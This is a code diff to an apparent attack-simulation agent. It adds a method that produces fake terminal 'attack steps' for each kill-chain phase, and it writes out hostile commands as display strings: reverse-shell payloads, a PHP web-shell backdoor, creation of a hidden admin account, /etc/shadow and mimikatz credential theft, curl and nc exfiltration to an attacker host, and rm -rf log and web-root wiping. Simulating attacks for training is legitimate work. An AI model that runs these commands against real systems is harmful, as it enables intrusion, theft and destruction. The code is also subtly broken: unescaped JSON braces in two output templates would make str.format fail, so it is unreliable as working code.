@@ -156,6 +156,7 @@ class AttackAgent(BaseAgent):
             'target_label': target_meta['label'] if target_meta else '',
             'vuln_match': vuln_match,
             'ai_analysis': ai_analysis,
+            'steps': self._generate_attack_steps(attack_type, current_phase, success, intensity, target_meta),
             'executed_at': datetime.now().isoformat()
         }
 
@@ -169,6 +170,164 @@ class AttackAgent(BaseAgent):
 
         return result
     
+    def _generate_attack_steps(self, attack_type: str, phase: int, success: bool,
+                                intensity: int, target_meta: dict = None) -> list:
+        """
+        生成模拟攻击步骤（命令 + 输出），用于终端风格展示。
+        根据攻击类型和 Kill Chain 阶段生成 3-5 条步骤，每条含模拟命令与伪造返回结果。
+        """
+        target = '192.168.1.100'  # 模拟目标（必须放最前，避免Python将后续f-string中的target视为局部变量）
+        domain = 'target.local'
+        lhost = '192.168.1.200'
+
+        # 阶段对应的真实攻击技术（命令片段）
+        TECH_COMMANDS = {
+            # 阶段1：侦察
+            '端口扫描': [
+                ('nmap -sV -p 1-1000 {target}', 'Starting Nmap 7.92\nHost is up (0.003s latency).\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9\n80/tcp   open  http     Apache httpd 2.4.52\n3306/tcp open  mysql    MySQL 5.7.38\n8000/tcp open  http     Python http.server'),
+                ('nmap --script vuln {target}', 'Nmap scan report for {target}\n| http-enum:\n|   /admin/: Admin panel\n|_  /phpmyadmin/: phpMyAdmin'),
+            ],
+            '服务识别': [
+                ('whatweb {target}', 'http://{target} [200] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux]\n| https-headers: PHP/8.1.0'),
+                ('curl -I http://{target}/robots.txt', 'HTTP/1.1 200 OK\nServer: nginx/1.18.0'),
+            ],
+            'OSINT信息收集': [
+                ('theHarvester -d {domain} -b all', '[+] Emails found: 5\nadmin@{domain}\ntest@{domain}\n[+] Hosts found: 12'),
+                ('whois {domain}', 'Domain Name: {domain}\nRegistrar: Alibaba\nName Server: f1g1ns1.dnspod.net'),
+            ],
+            'Web目录枚举': [
+                ('dirb http://{target} /usr/share/dirb/wordlists/common.txt', '+ http://{target}/admin (CODE:200|SIZE:1024)\n+ http://{target}/phpmyadmin (CODE:200|SIZE:8192)'),
+                ('gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt', '/admin               (Status: 200) [Size: 1024]\n/uploads            (Status: 301) [Size: 0]'),
+            ],
+            # 阶段2：武器化与投递
+            '漏洞扫描': [
+                ('nikto -h http://{target}', '+ Server: Apache/2.4.52\n+ /phpmyadmin/: phpMyAdmin backend\n+ OSVDB-3268: /admin/'),
+                ('openvas --target {target} --scan', '[+] Vulnerability found: Apache < 2.4.53 Remote Code Execution (CVE-2021-41773)'),
+            ],
+            '鱼叉式钓鱼': [
+                ('swaks --to target@{domain} --from no-reply@{domain} --server {target}', '=== Connected to {target}:25\n250-CHRYZON\n250-SIZE 35840000\n250 HELP\n** Message queued'),
+            ],
+            'Exploit定制': [
+                ('msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f elf > payload.elf', 'No platform was selected, choosing Linux as the target platform'),
+                ('searchsploit {attack_type}', '{attack_type} exploits/linux/remote/xxxx.rb'),
+            ],
+            '供应链攻击': [
+                ('npm audit --json -p https://{target}/package.json', '{{"vulnerabilities":{{"prototype-pollution":1}}}}'),
+            ],
+            # 阶段3：漏洞利用
+            'SQL注入利用': [
+                ("sqlmap -u 'http://{target}/search?q=1' --dbs --batch", '[INFO] testing SQL injection on back-end DBMS\n[INFO] fetching database names\n[+] information_schema\n[+] mysql'),
+                ("sqlmap -u 'http://{target}/search?q=1' -D mysql --dump-all --batch", '[+] Table: users\n| id | username | password | email |\n| 1  | admin    | ******  | admin@{domain} |'),
+            ],
+            'RCE远程代码执行': [
+                ("curl http://{target}/cgi-bin/status?cmd=id", 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'),
+                ("curl -X POST http://{target}/api/exec -d 'cmd=whoami'", 'www-data'),
+            ],
+            'Web Shell上传': [
+                ('curl -F "file=@shell.php" http://{target}/upload', '{"result":"success","path":"/uploads/shell.php"}'),
+                ("curl http://{target}/uploads/shell.php?cmd=id", 'uid=0(root) gid=0(root)'),
+            ],
+            '反序列化攻击': [
+                ('python ysoserial.py CommonsCollections6 "curl {lhost}:8080/shell" > payload.ser', '[+] Payload generated'),
+                ('curl -X POST http://{target}/api -d @payload.ser', 'HTTP/1.1 200 OK\n{"code": 200}'),
+            ],
+            # 阶段4：持久化与提权
+            '后门植入': [
+                ('echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/backdoor.php', ''),
+                ("nc -lvnp 4444", 'listening on [any] 4444'),
+            ],
+            '创建隐藏账户': [
+                ('net user hacker P@ssw0rd123 /add', 'The command completed successfully.'),
+                ('net localgroup administrators hacker /add', 'The command completed successfully.'),
+            ],
+            '提权利用': [
+                ('python3 -c "import os;os.setuid(0);os.system(\'/bin/bash\')"', '# whoami\nroot'),
+                ('sudo -l', 'User www-data may run the following commands:\n    (ALL : ALL) ALL'),
+            ],
+            '持久化服务注册': [
+                ('systemctl enable backdoor', 'Created symlink /etc/systemd/system/multi-user.target.wants/backdoor.service'),
+                ('crontab -e', '* * * * * /var/tmp/.hidden/backdoor.sh'),
+            ],
+            # 阶段5：横向移动
+            '内网扫描': [
+                ('nmap -sn 192.168.1.0/24', 'Nmap scan report for 192.168.1.1\nHost is up (0.001s latency).\nNmap scan report for 192.168.1.100\nHost is up'),
+                ('nbtscan 192.168.1.0/24', '192.168.1.1:     SERVER01       <SERVER>'),
+            ],
+            '凭证窃取': [
+                ('cat /etc/shadow | grep root', 'root:$6$rYl...:19137:0:99999:7:::'),
+                ('mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit', '[+] sekurlsa - Credentials extracted'),
+            ],
+            '哈希传递攻击': [
+                ('pth-winexe -U Administrator%LMHASH //192.168.1.100 cmd', 'C:\\Windows\\system32> whoami\nSERVER01\\Administrator'),
+                ('crackmapexec smb 192.168.1.0/24 -u Administrator -H LMHASH', 'SMB         192.168.1.100  445    SERVER01       [+] WORKGROUP\\Administrator'),
+            ],
+            'C2通道建立': [
+                ('./empire --listeners', '[*] listeners\n    Name: https\n    Host: https://{lhost}:8443\n    Port: 8443'),
+                ('./empire --stager http_receptor', '[+] Stager generated: /tmp/stager.bat'),
+            ],
+            # 阶段6：目标行动
+            '敏感数据窃取': [
+                ('find /var/www/html -name "*.sql" -o -name "*.env" | xargs grep -l PASS', '/var/www/html/config.php'),
+                ('cat /var/www/html/config.php | grep password', '$db_pass = "P@ssw0rd123";'),
+            ],
+            '数据隐蔽外传': [
+                ('curl --data-binary @/tmp/exfil.db https://{lhost}:8080/upload', 'HTTP/1.1 200 OK'),
+                ('tar czf - /var/www/html | openssl enc -aes-256-cbc | nc {lhost} 4444', ''),
+            ],
+            '日志清除': [
+                ('rm -rf /var/log/*', ''),
+                ('history -c && echo "" > ~/.bash_history', ''),
+            ],
+            '业务破坏': [
+                ('rm -rf /var/www/html/*', ''),
+                ('shutdown -h now', 'Connection to {target} closed.'),
+            ],
+        }
+
+        # 默认步骤（未匹配到特定攻击类型时使用）
+        DEFAULT_STEPS = [
+            (f'nmap -sV -O {target}', 'Host is up\nOS: Linux 5.4'),
+            (f'nikto -h http://{target}', '+ Server: Apache/2.4.52'),
+            (f'searchsploit {attack_type}', '{attack_type} exploits...'),
+        ]
+
+        # 获取该攻击类型对应的命令列表
+        candidates = TECH_COMMANDS.get(attack_type, DEFAULT_STEPS)
+        steps = []
+
+        # 根据攻击是否成功选择展示几步
+        if success:
+            # 成功：展示更多步骤（3-5步）
+            import random as _r
+            count = _r.randint(3, min(5, len(candidates)))
+            selected = candidates[:count]
+        else:
+            # 失败：展示2-3步
+            count = min(2, len(candidates))
+            selected = candidates[:count]
+
+        for cmd_template, output_template in selected:
+            # 替换占位符
+            cmd = cmd_template.format(target=target, domain=domain, lhost=lhost, attack_type=attack_type)
+            output = output_template.format(target=target, domain=domain, lhost=lhost, attack_type=attack_type)
+            steps.append({
+                'step': len(steps) + 1,
+                'command': cmd,
+                'output': output,
+                'status': 'success' if success else 'failed'
+            })
+
+        # 如果成功，追加总结步骤
+        if success:
+            steps.append({
+                'step': len(steps) + 1,
+                'command': f'echo "[+] {attack_type} 攻击成功，阶段 {phase} 完成"',
+                'output': f'[+] {attack_type} -> 目标系统已被渗透，进入下一阶段',
+                'status': 'success'
+            })
+
+        return steps
+
     def _ai_analyze_attack(self, attack_type: str, success: bool, intensity: int, phase: int,
                            target_meta: dict = None, vuln_match: bool = False) -> str:
         """使用 AI 分析攻击结果 - 攻击Agent使用高temperature(0.8)增加策略多样性"""
